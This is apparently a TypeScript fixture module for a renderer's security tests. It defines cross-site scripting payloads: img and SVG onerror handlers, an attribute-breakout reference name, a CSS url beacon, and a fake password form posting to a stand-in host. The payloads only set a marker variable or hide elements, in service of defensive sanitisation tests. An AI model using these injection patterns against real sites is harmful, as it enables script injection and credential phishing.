/**
 * Script payloads shared by the `xss` fixture (browser side) and `security.spec.ts` (node side).
 *
 * Kept free of imports on purpose: the spec needs these at runtime, and importing them from
 * `harness/fixtures.ts` would drag `src/index` — stylesheet and all — through Playwright's
 * Node-side transform.
 */

/**
 * The statement a payload runs if it ever executes: appends its tag to `window.__pvtXss`, which
 * the security spec reads back. Deliberately bracket-free — the `[[node]]` tokenizer rejects
 * `[` and `]`, so a payload containing them would never reach the renderer under test.
 */
export function xssReport(tag: string): string {
    return `window.__pvtXss=(window.__pvtXss||'')+'${tag},'`
}

/** An `<img>` whose failed load fires {@link xssReport} — inert unless parsed as markup. */
export function xssPayload(tag: string): string {
    return `<img src=/pvt-xss-${tag}.png onerror="${xssReport(tag)}">`
}

/** Inline SVG whose `<image>` carries a payload handler, for a node's `style.svgIcon`. */
export function xssSvgIcon(tag: string): string {
    return `<svg xmlns="http://www.w3.org/2000/svg"><image href="/pvt-xss-${tag}.png" onerror="${xssReport(tag)}"/></svg>`
}

/** Note content whose `[[…]]` reference name tries to break out of its attribute. */
export const XSS_NOTE = `see [[x"><img src=/pvt-xss-note.png onerror="${xssReport('note-reference')}">]] here`

/** The reference name the tokenizer should capture from {@link XSS_NOTE}, verbatim. */
export const XSS_NOTE_REFERENCE_NAME = `x"><img src=/pvt-xss-note.png onerror="${xssReport('note-reference')}">`

/**
 * A CSS value that is really an outbound request. Inert everywhere except where an unvalidated
 * colour is substituted into a `background`, which is the whole point of testing it.
 */
export const CSS_BEACON = 'url(/pvt-xss-css.png)'

/** A URL carrying no scheme that leaves the origin regardless — it is not a relative path. */
export const OFF_ORIGIN_RELATIVE = '//pvt-xss.test/sso-login'

/**
 * Note content holding what DOMPurify's default profile kept: a `<style>` scoped to the document
 * rather than to the note, and a form that posts from the host's own origin. The rule aims at the
 * canvas, so a leak shows up as the canvas disappearing rather than as a stray tag.
 */
export const NOTE_PAGE_MARKUP = '<style>.pvt-canvas{display:none}</style>'
    + '<form action="https://pvt-xss.test/collect">'
    + '<input name="p" type="password"><button>Sign in</button></form>'

/** Ordinary Markdown, to prove the allow-list did not take the feature down with the payloads. */
export const BENIGN_NOTE = 'a **bold** word, a [link](https://example.test/x) and `code`'

/**
 * An icon carrying the two elements the SVG profile allows but an icon has no use for: a
 * document-wide `<style>`, and an `<a>` that would turn selecting the node into a navigation.
 * Its rule aims at notes, so a leak shows up as the note vanishing.
 */
export function chromeSvgIcon(): string {
    return '<svg xmlns="http://www.w3.org/2000/svg">'
        + '<style>.pvt-note{display:none}</style>'
        + '<a href="https://pvt-xss.test/"><circle r="10" fill="#0077cc"/></a>'
        + '</svg>'
}
